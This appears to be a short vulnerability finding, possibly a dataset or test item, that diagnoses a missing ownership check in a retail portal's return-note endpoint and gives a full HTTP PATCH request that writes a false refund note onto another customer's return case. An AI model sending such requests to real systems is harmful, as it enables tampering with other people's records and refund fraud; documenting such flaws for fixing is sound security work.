diagnosis: The AppendRMANote handler accepts arbitrary notes for return merchandise authorizations based solely on the rmaID path parameter. Because the return record is not verified against the caller's customer account, any customer can append false or misleading notes to other customers' return cases.
exploit_request:
PATCH /returns/rma-8831/notes HTTP/1.1
Host: shop.retail-portal.com
Authorization: Bearer customer_token_410
Content-Type: application/json

{"note": "Customer accepted refund in store credit on 09/01"}
